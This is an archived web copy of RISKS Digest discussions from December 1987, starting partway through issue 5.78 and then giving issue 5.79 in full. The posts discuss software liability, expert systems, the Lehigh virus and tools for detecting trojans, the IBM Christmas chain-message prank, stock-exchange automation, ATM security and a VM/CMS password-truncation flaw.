
Will kids enjoy a lower risk?  No.  Public health authorities are now
arranging to buy vaccine from foreign sources when domestic is no
longer available.  Foreign labs can equal quality of domestic
manufacturers.  They can't do any better.  Sometimes they do worse.
But the alternative is no vaccine at all.

The simple RISKS:
	No matter what, every injection RISKS death.
	Not to inject RISKS polio for that individual.
The less simple RISKS:
	Drug manufacturers RISK getting sued.
	We all RISK a public health disaster.
The interaction RISK:
	Companies take fewer RISKS to develop and sell useful drugs.

How does this apply to expert systems?  By analogy.  There's the RISK,
well known to RISKS readers, of not using the computer.  This could
result from companies taking longer to develop and test the system,
meanwhile perhaps the expertise it provides is less available.  Or it
could result from fewer companies choosing to invest in expert system
development.  Perhaps the entire field might advance and find
acceptance and application more slowly.  Is anyone willing to stand up
and say that we'd be worse off if commercial and widespread use of
expert systems were delayed by ten years?  How about twenty?  Perhaps
we'd all be better off, if the software were twenty years better
understood when it becomes an off-the-shelf product.

More generally, what are the trade-offs involved in driving the
creation of software by fear of lawsuit?  Does it motivate software
companies to take longer but deliver better product when they do
deliver it?  How many companies will instead choose to develop less
flexible, more constrained, less generally useful software?  Any degree
of experience with the computer field should convince one that there's
satisfying amounts of money to be made offering incrementally better
software at last year's prices.  How often will the released product
behave no more safely or correctly than it would have if we got it five
years earlier, but now the product manager can tell the jury "We did
five years of in-house testing!"

How many companies will make code that does little beyond covering the
seller's, uh, liabilities?  There are features of non-computer products
out there aimed specifically at limiting liability, features which
exist solely to be pointed out to juries as Safety Measures We Took.
How useful will software be that follows this model?

How many companies will do what they can to develop a good product but
put their faith in passing along their court and settlement costs to
their customers?  And how many will simply choose not to enter the
market, because in our zeal to protect the buyer we left the seller a
little too exposed?  How many of them would otherwise create wonderful
and useful systems, which like vaccines are used with risk but are
better than the alternative.  It's hard to evaluate this RISK.  But
it's there.  In my opinion it argues against punitive litigation as the
buyer's sole remedy and seller's chief motivation for quality.

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Re: Australian telecom blackouts and 'hidden' crimes (<A HREF="/Risks/5.73.html">RISKS-5.73</A>)
</A>
</H3>
<address>
Jon A. Tankersley
&lt;<A HREF="mailto:uunet!apctrc!cr1a!zjat02@mimsy.umd.edu ">
uunet!apctrc!cr1a!zjat02@mimsy.umd.edu 
</A>&gt;
</address>
<i>
Tue, 15 Dec 87 14:36:58 CST
</i><PRE>
Organization: Amoco Production Co, Tulsa Research Center

In Tulsa, about 3 years ago over Thanksgiving weekend, criminals took
chainsaws to the wiring boxes of the phone company to cover up other crimes.
The service to about 1/3-1/2 of Tulsa was knocked out.  The criminals were
later caught.  Unfortunately I can't seem to remember any particulars.  I've
been asleep a few times since then.
                                                   -tank-

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Wall Street Kills The Messenger
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
Thu, 17 Dec 87 16:00:23 CST
</i><PRE>
From: umn-cs!datapg.MN.ORG!sewilco@cs-gw.D.UMN.EDU (Scot E. Wilcoxon)

"Wall Street Kills The Messenger" is an article in 'Computer &amp;
Communications DECISIONS', Dec 1987, pg 72-74,104.

The problem on Wall Street was not too much automation but rather too little.
The investment strategy which most obviously failed was portfolio insurance.
Portfolio insurance assumes quick trades.  The weak point was not the NYSE
computers but rather the interface between them and the human traders.
Futures contracts trading speed was limited by the speed of printers and human
traders on foot in the NYSE floor.  Liquidity seemed to vanish.

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Expert systems; Ejection notice? (<A HREF="/Risks/5.76.html">RISKS-5.76</A>)
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@ames-aurora.arpa">
steve@ames-aurora.arpa
</A>&gt;
</address>
<i>
Thu, 17 Dec 87 13:32:34 PST
</i><PRE>

Here are some responses to a few of today's postings.

From: nsc!taux01!taux01.UUCP!amos@Sun.COM (Amos Shapir)
It seems the main problem is blindly relying on expert systems, because of lack
of time and expertise. A well designed expert system should therefore give not
only the answers, but also the decision path by which it got at them. A country
doctor may not have all the knowledge that a hospital system provides, but may
well be qualified to judge whether a decision like 'the patient has blue eyes
therefore it's pneumonia' is valid in a particular case.

	This is an excellent idea, and the method should be followed
	whenever possible.  It can't be done in all cases, though, as
	many expert system applications are real time, and the operator
	can't examine the entire decision path in the time available.
	For example, a pilot flying an aircraft through a fly-by-wire
	system can't examine all the control logic while flying the
	airplane.  We can (and should) strive to give as much pertinent
	information about the decisions as possible.

	The NASA Aviation Safety Reporting System (ASRS) contains many
	reports on automated systems problems.  One of particular 
	interest concerns ground proximity warning systems.  A commercial
	crew reported landing after a GPWS alert on approach, as they thought 
	that the alert was erroneous.  (The alert was your standard "pull-up"
	voice message).  It turns out that the flaps were only partialy
	deployed and not at their correct landing setting.  The GPWS could
	have been programmed to alert them to the specific logic rule
	that caused it to activate (e.g. "pull up!  flaps not in landing
	configuration").  This might be difficult to do in practice, as 
	the GPWS considers many factors, and would have to be making a
	conclusion about the intended maneuver.  

	It's interesting to note that in this case the crew did not 
	blindly follow the reccomendation of their expert system --
	as far as they determined, the expert system was at fault.
	Who would have been judged liable if there was an accident
	as a result of this situation?

From: mnetor!utzoo!henry@uunet.UU.NET

&gt;Mind you, there is a negative side to having a relatively thin canopy.  There
&gt;was a recent accident in Britain, not yet explained in detail, which *might*
&gt;have been due to the parachute-deployment system of an ejection seat firing
&gt;*through* the canopy by accident (i.e. not as part of an ejection) and pulling
&gt;the pilot out of the plane after it.  The plane (a Harrier) unfortunately kept
&gt;on flying and eventually ran out of fuel over deep ocean.  Recovering it will 
&gt;be difficult, but may be tried because more information is badly needed.

   Aviation Week printed a preliminary article on this accident.  It seems
that the Harrier had an experimental back-up bail-out system.  There had been
some problems with low-altitude ejections, so this new system was devised in
case the normal ejection seat did not function.  It was supposed to work by
firing a rocket to deploy the pilot's chute, and to release him from the
ejection seat.  Every ejection system has a safe deployment envelope -- it
appears that the Harrier was flying faster\ than the top of this systems
limit.  The accident investigators have found no way that the system could
have been accidently fired, and are tyring to determine if the pilot
intentionally activated the system.

   It seems that even emergency backup systems have their risks.  These
systems must also be integrated into the overall system.  Perhaps for
computer driven systems there should be manual (physical) interlocks
hardwired in to prevent dangerous excursions from normal operation.

Steve Philipson, NASA/Ames Research Center, Moffet Field, CA

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 squirrels, mice, bugs, and Grace Hopper's moth
</A>
</H3>
<address>
Mark Mandel 
&lt;<A HREF="mailto:Mandel@BCO-MULTICS.ARPA">
Mandel@BCO-MULTICS.ARPA
</A>&gt;
</address>
<i>
Fri, 18 Dec 87 12:06 EST
</i><PRE>
To: RISKS@csl.sri.com

The word "bug", in the sense we use in the computer world, did NOT
originate with "Amazing" Grace Hopper's moth.  It is attested in
non-computer environments, but with the same meaning ("a mistake in
design that causes errors in operation"), from before the time of the
computer; certainly before the date of the log entry-with-moth.  William
Safire discussed this around a year ago.  I've found a use in a
little-known non-Tarzan novel of Edgar Rice Burroughs (_Beyond the
Farthest Star_), in a context of aerodynamics or rocket design.  Though
the date of the book is a couple of years after Hopper's moth, the usage
-- without explanation, as a colloquialism that the author assumes the
reader will understand -- is evidence that the term was already well
known among engineers outside the then-nascent field of computing.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.77.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.79.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-31</DOCNO>
<DOCOLDNO>IA012-000130-B023-17</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.79.html 128.240.150.127 19970217014719 text/html 25798
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:45:46 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 79</TITLE>
<LINK REL="Prev" HREF="/Risks/5.78.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.80.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.78.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.80.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 79</H1>
<H2> Sunday, 20 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Re: Lehigh Virus 
</A>
<DD>
<A HREF="#subj1.1">
James Ford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  IBM Xmas Prank 
</A>
<DD>
<A HREF="#subj2.1">
Fred Baube
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  National security clearinghouse 
</A>
<DD>
<A HREF="#subj3.1">
Alan Silverstein
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Financial brokers are buying Suns... 
</A>
<DD>
<A HREF="#subj4.1">
John Gilmore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Toronto Stock Exchange Automation? 
</A>
<DD>
<A HREF="#subj5.1">
Hugh Miller
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Who Sues? 
</A>
<DD>
<A HREF="#subj6.1">
Marcus J. Ranum
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The Fable of the Computer that Made Something 
</A>
<DD>
<A HREF="#subj7.1">
Geraint Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Litigation over an expert system 
</A>
<DD>
<A HREF="#subj8.1">
Rich Richardson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Tulsa; Bugs 
</A>
<DD>
<A HREF="#subj9.1">
Haynes
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  More ATM information 
</A>
<DD>
<A HREF="#subj10.1">
George Bray
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Truncation 
</A>
<DD>
<A HREF="#subj11.1">
Alex Heatley
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
     Re: Lehigh Virus (<A HREF="/Risks/5.72.html">RISKS-5.72</A>)
</A>
</H3>
<address>
"James Ford (Phantom)" 
&lt;<A HREF="mailto:JFORD1%UA1VM.BITNET@CUNYVM.CUNY.EDU">
JFORD1%UA1VM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Fri, 18 Dec 87 15:16:33 CST
</i><PRE>
To: RISKS@csl.sri.com

I've been reading about the PC virus that invaded Lehigh Univ.  There is
public domain software (2 that I know of now) that will detect potential
"trojans" and/or "bombs".  These programs are:

1.  CHK4BOMB (check 4 bomb) - This program is used on suspected trojans.
The program will read and print the ASCII code.  After that, it'll start
reading the machine code.  If the file writes to absolute sectors, CHK4BOMB
will respond with "WARNING! THIS PROGRAM WRITES TO ABSOLUTE SECTORS! THERE
IS A CHANCE THAT DATA COULD BE LOST....etc"

2.  BOMBSQAD - This program is a memory resident program that will allow you
to intercept READ, WRITE and VERIFY (in any combination) to your hard/floppy
disks.  It allow you to abort the suspected command by returning a timeout
error (I think) to DOS, which gives you a ABORT, RETRY, IGNORE........

While I can't state that it will detect ALL trojans, these "binary condoms"
have detected the COMMAND.COM virus at LeHigh Univ.

Since the programs are public domain, I will gladly send them to you if you
request them.  If sent, the files will uploaded WITHOUT converting to EBCDIC.

James Ford, The Phantom, JFORD1@UA1VM.BITNET

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
IBM Xmas Prank
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Fri, 18 Dec 87 10:03:57 -0500
From: Fred Baube &lt;fbaube@note.nsf.gov&gt;

From Friday's Washington Post, excerpted without permission.

"The message popped onto desktop screens in IBM offices around
the country and even crossed the Atlantic and Pacific oceans,
showing up in IBM outposts in West Germany, Italy and Japan."

[as pictured                X
 in the article]           X X
                          X X X
                         X X X X
                        X X X X X
                       X X X X X X
                      X X X X X X X
                            X
                            X
                            X

A very happy Christmas and my best wishes for the next year.
             Let this run and enjoy yourself.
Browsing this file is no fun at all.  Just type Christmas.
________

"The message that bedeviled IBM was a comparatively benevolent
one and did not, as computer tricksters' creations sometimes do,
destroy other material in the system .. [although] rapidly
producing electronic gridlock."

"The culprit is unknown .. but preliminary investigation suggests
that the message originated outside the company.  IBM's mail
system is attached to those of several other institutions."

"From start to finish, the message survived only hours .."

"Does the world's biggest and most advanced computer company feel
embarassed about its Christmas chain ?  'We didn't want it to
happen, but we anticipated something like this might be attempted
and we were prepared to deal with it.'"

Questions:
(1) An incoming message can contain an executable program,
    that can easily be run ?
(2) Such a message can be remailed under its contained program's
    control, presumably with the name of the last victim in the
    "From:" field ?
(3) Can IBM trace it to an originator, or was anonymity possible ?
(4) How/where can readers of RISKS submit something similar ?
    (strictly for professional testing purposes)
(5) Is the Internet similarly vulnerable ?

The prank seems to be benign, and therefore beneficial.
IBM seems to have dealt with it effectively (or have they ?).

Browsing this message is no fun at all.  Just type Christmas ..

          [Bay Area folks can read a long front-page article by John 
          Markoff on viruses in today's SF Chronicle-Examiner.  PGN]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
national security clearinghouse
</A>
</H3>
<address>
Alan Silverstein 
&lt;<A HREF="mailto:hpfcdt!ajs@hplabs.HP.COM">
hpfcdt!ajs@hplabs.HP.COM
</A>&gt;
</address>
<i>
Fri, 18 Dec 87 14:27:32 mst
</i><PRE>

&gt; Andy Freeman, Security failures..., <A HREF="/Risks/5.77.html">RISKS-5.77</A>
&gt; A clearinghouse, repository, library, or whatever name one wants to give
&gt; to such a function should be set up so that those of us who are trying
&gt; to build defenses can have subjects to study.

This falls right in the charter of the National Computer Security Center
(NCSC), a federal agency.  They are also the folks who evaluate Trusted
Computer Systems by the Evaluation Criteria (Orange Book).  Their services
are "free" (tax-supported).
                                          Alan Silverstein, Hewlett-Packard

   [We have noted this here before, but it seems worth reminding new
   readers that all sorts of systems have been evaluated.  PGN]

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Financial brokers are buying Suns...
</A>
</H3>
<address>
John Gilmore
&lt;<A HREF="mailto:hoptoad.UUCP!gnu@cgl.ucsf.edu ">
hoptoad.UUCP!gnu@cgl.ucsf.edu 
</A>&gt;
</address>
<i>
Sat, 19 Dec 87 04:26:22 PST
</i><PRE>
To: risks@csl.sri.com

&gt;    In hindsight, it seems that computers on Wall Street created an  
&gt;    appetite they ultimately couldn't satisfy.  Following the classic 
&gt;    addicts' pattern, each time investors got more powerful computers,  
&gt;    they developed investment techniques that needed even more powerful 
&gt;    computers....

By the way, one of the hottest new markets for Suns (and possibly other
workstations) is in financial trading.  A bunch of companies are doing
software that lets a broker monitor a bunch more stuff, get plots of
stock trends, etc, on their bitmapped Sun screen.  Just being able to
display N things at once in N windows will help a lot.

Today's common "quotron" terminals seem to just be dumb terminals.
Well-designed support software on Suns should be able to aid brokers,
the same way it has helped me to get more programming done in the
same amount of time, and with higher quality.

   [Wait until people figure out the nice network security 
   flaws/features in such an environment.  That will give a new 
   meaning to INSIDER TRADING, using INSIDER COMPUTER FRAUD.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     Toronto Stock Exchange Automation?
</A>
</H3>
<address>
Hugh Miller 
&lt;<A HREF="mailto:HUGH%UTORONTO.BITNET@CUNYVM.CUNY.EDU">
HUGH%UTORONTO.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Sun, 20 Dec 87 14:21:03 EST
</i><PRE>
To: "Peter G. Neumann, Moderator" &lt;RISKS@csl.sri.com&gt;

The following is excerpted without permission from "Computers-or-people
dispute flares at TSE" by Fred Lebolt, *Toronto Star*, Sa 19 Dec 87, p. B1:

    A dispute between floor traders and senior management at the Toronto Stock
  Exchange is brewing again, as the exchange studies whether computers or
  people should be at the center of stock market action.  After what one
  exchange official described as a "shooting match" between the two sides, the
  exchange has launched a new, $1.25 million study looking into computer-based
  trading compared with person-to-person stock market trades.
  "People's livelihoods are involved here, so tensions and anxieties are high,"
  the official said in an interview.[...]

  Newspaper photos and television clips of the stock exchange usually show the
  floor traders in action:  often wearing brightly colored jackets, they're the
  ones who yell buy and sell orders on the exchange floor.  At the heart of the
  action are the specially designated registered floor traders.  This group of
  more than 100 individuals will guarantee to buy or sell a certain number of
  shares so the public will always be able to trade in those securities, and
  will oversee trading to make sure there's a small spread between the buy and
  sell prices.  They have to keep tabs on all the trades in the stocks they
  follow.
  
    Computer-based trading, by contrast, involves putting orders through by
  machine, with the buy and sell prices displayed on video terminals.  The
  people behind the machines are also traders, but the deals are struck by
  computer keystrokes, rather than in person.[...]
  
    The controversy over computerized trading has been simmering for some time,
  but erupted a year ago after the exchange's board of governors approved a
  plan to switch two large stock issues from the trading floor to the
  TSE-developed Computer Assisted Trading System, known as CATS.  CATS was
  originally introduced to handle trades in less active stocks, while major
  share issues remained in the hands of floor traders.  The computerized system
  now handles almost half of the total listings on the exchange.  But the news
  that two large stock issues were going over to CATS hit like a bombshell.
  Traders banded together into a Professional Traders Association to voice
  their concerns.
  
    What emerged was a compromise deal, in which an experimental trading area
  was set up using both floor traders and computer technology.  But the
  controversy stirred up again in June, when the exchange startedpushing for a
  rapid expansion of the experimental trading posts throughout the floor.  Many
  traders argued that the move was premature, and sought a postponement in the
  expansion, which they won.
  
    The July report [prepared for the exchange found advantages in the
  computer-based trading system and] reopened the controversy.  [A second
  report, issued in September and prepared for Gordon Capital Corp., disputed
  much of the first report's findings.  A subsequent letter sent to Toronto
  Stock Exchange members by Gordon Capitol president Donald Bainbridge said
  conclusions from the July report "were a real shock to the many experienced
  traders" who reviewed it.]
  
    The latest study now under way involves management, traders, and other
  groups. It is looking into a variety of key issues about future directions
  for trading and the over-all market environment.[...]  When asked
  specifically if he believes there will be still be person-to-person trades on
  the exchange floor five years from now, [exchange vice-president Terry]
  Popowich [,who has management responsibility for floor trading,] replied, "I
  don't know.  "I also don't know if there's going to be completely automated
  trading."

This is the first indication I have seen that a stock exchange is considering
abandoning open outcry entirely in favour of completely on-line trading.

Previous contributions to this list have emphasized the limited role
computers play in performing or influencing actual trading.  It has been
pointed out that they are most often utilized in margin trading, and in
portfolio insurance (where, it has been hypothesized, they can contribute
most to market instability during large fluctuations in share prices).

There is in this story little indication that human beings will not be at the
keyboards of the new, totally on-line TSE. But the tendency in recent times has
definitely been to replace human judgment with machine judgment, on the grounds
that the latter is much faster and therefore able to take advantage of
favorable buy/sell conditions much sooner than humans, with correspondingly
greater earnings for the brokerages.

Given this tendency, are we on the way to the introduction of computer trading
programs to handle trading in *ALL* stock issues? And to handle the functions
previously reserved for the registered floor traders, as overseers and monitors
of price spreads?  And how will we insure that such enormously complex systems
will not synergetically go plooey when pushed to their volume or price limits?
  
Hugh Miller, Department of Philosophy, University of Toronto, Toronto, 
Ontario., CAN M5S 1A1 (416)536-4441 
  
</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Who Sues?  (Re: RISKS DIGEST 5.75)
</A>
</H3>
<address>
&lt;<A HREF="mailto:ucbcad!ames.UUCP!uunet.UU.NET!mimsy!jhu!osiris!mjr@ucbvax.Berkeley.EDU ">
ucbcad!ames.UUCP!uunet.UU.NET!mimsy!jhu!osiris!mjr@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Sat, 19 Dec 87 12:35:20 EST
</i><PRE>

	It would be nice to think that the current trend towards suing 
anyone and everything in the near vicinity of a mistake does not indicate
that Americans are not losing track of the basic principles of causality !!

	Can't anyone take credit for their own mistakes anymore ? If someone
wishes to place their trust in an ES, and it turns out to be misplaced, I'd
look at "assigning the blame" as follows:

Person who did not exercise common sense:	99.5%
Programmer who marketted malfun software:	00.4%
Assembly of chips and magnetic oxide:		00.1%

	Until it is a fact of reality that expert systems are KNOWN to be
reliable, then a person is unreasonable in trying to sue the producer of a
product that common sense would indicate as potentially unreliable.

	I understand that these views have no weight against current "law"
and "legal" decisions. On the other hand, our legal system is becoming less
and less a system of justice and common sense, and more and more a
self-feeding system of self-reproducing rules...

	It concerns me that nobody can stand up anymore and say "wow, I
goofed" or "I should have used my own !@#!@#!@# brain instead of flipping
a coin" when something goes wrong and they are associated with it. I can
see a case where an airplane crashes because of poor service as the fault
of the airline. There must, however, be a provision for acts of god, or a 
simple admission of stupidity. 

	An elderly woman recently won a lawsuit against a soda bottler because
her eye was hurt when a cap hit it. She was taking the cap off the bottle with
pliers, and the pliers slipped. Essentially, the "law" and the "lawyers" are
saying that it is permissible (even rewarded) to be stupid.
                                                                --mjr();

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
The Fable of the Computer that Made Something
</A>
</H3>
<address>
Geraint Jones 
&lt;<A HREF="mailto:geraint%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK">
geraint%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Sat, 19 Dec 87 14:21:15 GMT
</i><PRE>

It has happened  before,  but is worth  documenting  that almost  all the media
here reported the last year's erroneous calculations  of the Retail Price Index
as a computer  error.  It was the BBC's flagship evening radio news bulletin on
Friday that I heard report that ``a computer made a mistake''.  As far as I can
see,  this  time  it was not even the case that `the computer'  was incorrectly
instructed;  rather it was decided to perform  an (almost)  entirely  unrelated
calculation,  and it just so happened that a computer was used to do the adding
up. Using a computer means never having to say sorry.                        gj

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: Litigation over an expert system
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
18 Dec 87 21:18:46 PST (Friday)
</i><PRE>
To: Dean Sutherland &lt;Sutherland@TL-20B.ARPA&gt;
Cc: RISKS@csl.sri.com, RMRichardson.PA@Xerox.COM
From: Rich &lt;RMRichardson.PA@Xerox.COM&gt;

&gt; In Risks digest 5.71, chapman@russell.stanford.edu (Gary Chapman) 
&gt; mentions a "goofy" California law that provides for a defendant who
&gt; is only 1% responsible to pay 1% of the judgement.  Although this 
&gt; law may be goofy, it is a major improvement over previous versions. ...

I think the new law applies to "punitive damages" and real damages (actual
loss) may still be taken from any of the "deep pocket" defendants.  Am I wrong?

Rich

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Tulsa; Bugs (Re: <A HREF="/Risks/5.78.html">RISKS-5.78</A>)
</A>
</H3>
<address>
99700000
&lt;<A HREF="mailto:haynes@ucscc.UCSC.EDU ">
haynes@ucscc.UCSC.EDU 
</A>&gt;
</address>
<i>
Sat, 19 Dec 87 00:07:53 PST
</i><PRE>

1) RE the Tulsa event of criminals sawing up telephone boxes.  Here in Santa
Cruz a few weeks ago transients living under a bridge built a fire to keep
warm - right on top of a nest of conduits carrying telephone cables!

2) RE "Bug" - I remember vaguely reading some boys' book of the 1920s
(something like Tom Swift) in which one of the characters is working on his
invention and says he just has to get a few bugs out before it will work right.

haynes@ucscc.bitnet, ...ucbvax!ucscc!haynes, ...

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
 More ATM information
</A>
</H3>
<address>
    George Bray 
&lt;<A HREF="mailto:lcc.ghb@SEAS.UCLA.EDU">
lcc.ghb@SEAS.UCLA.EDU
</A>&gt;
</address>
<i>
Thu, 17 Dec 87 19:33:54 PST
</i><PRE>

We have discussed several issues of ATMs recently, and I want to add
a few more nuggets:

1.	Recently, a contributor mentioned that their bank claimed that
	"the ATM cuts the card if there is something wrong with it."
	I have experience with ATMs made by IBM, Docutel and Diebold
	(and various Diebold emulators) and none of them cut the card
	when capturing it.  It is simply stacked inside the machine.

	Typically, bank tellers do cut the cards up after removing
	them from the machine, but that is done by a person, not by
	the ATM.

2.	Another contributor mentioned that banks don't wish to discuss
	their systems, even when they implement standards that are publicly
	available.  This is quite true in my experience.  The manufacturers
	of bank hardware and the banks themselves depend mostly upon
	ignorance for protection.

3.	Most bank transaction security is aimed at preventing losses to
	the bank, not to the cardholder.  In fact, ATM security isn't
	seen as a big problem, because even with a stolen card, the most
	a burglar could get away with is a few hundred dollars at a time.
	(Again, tough on the poor customer, but it is cheap for the bank
	to eat the loss if the customer complains).
	
	In fact, the prevailing attitude is that the major threat to
	ATMs is physical: since there is about $40,000 in a fully-loaded
	ATM, but it will only dispense a maximum of a few dozen bills at
	a time, the easiest way to get money out is to blow the front
	off the ATM, or attack it with a car, etc.

4.	As an aside, it is interesting that in many cases bank regulations
	have not caught up with the concept of ATMs.  In California at
	least, the banking laws stipulate that any location that accepts
	deposits for a bank must be a branch of that bank.  This means 
	that ATMs owned by a different bank can't be used for deposits,
	even if the data processing and money handling for the two banks
	are run by the same data processing provider.

	This regulation becomes onerous when combined with the definition
	of a transfer: "a withdrawal from one account followed by a deposit
	to another account".  This means that one is not allowed by law to
	press a button on an ATM commanding a computer to transfer funds
	between two accounts which consist of bits on a disk drive
	connected to that computer.  
                                                  George Bray

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Truncation (Doug Mosher, Re: <A HREF="/Risks/5.69.html">RISKS-5.69</A>)
</A>
</H3>
<address>
Alex Heatley 
&lt;<A HREF="mailto:alex@comp.vuw.ac.nz">
alex@comp.vuw.ac.nz
</A>&gt;
</address>
<i>
Tue, 8 Dec 87 15:24:43 +1300
</i><PRE>
Organization: Comp Sci, Victoria Univ, Wellington, New Zealand

&gt;  It is ALWAYS BAD PRACTICE to truncate anything without notice.
&gt;
&gt;Many examples over the years occur to me; here's a small partial list.

Regarding VM/CMS (IBM Mainframe OS) here's a nasty one that has caught me
twice. When you change your password you are allowed to enter one that is
longer than 8 characters. However, upon logging in, your password is
truncated to 8 characters. The OS goes away and compares the entered
password with the one in the file (passwords are kept in clear in a special
file that only the SYSADMIN is supposed to be able to access -- ha!)  aha!
it says these are not equivalent and refuses to let you log in.

Now you know that you typed in the right password so you try again but, after
five attempts the OS will lock you out of the terminal. So you walk away in
confusion. If the terminal is in a public place, eventually, another user
will try to use the terminal -- and will receive the error message that they
can't login -- yes that's right the OS locks the terminal from being used
until either the SYSADMIN resets it or n (SYSADMIN defined) hours have elapsed.

Aren't IBM OS's fun!!!

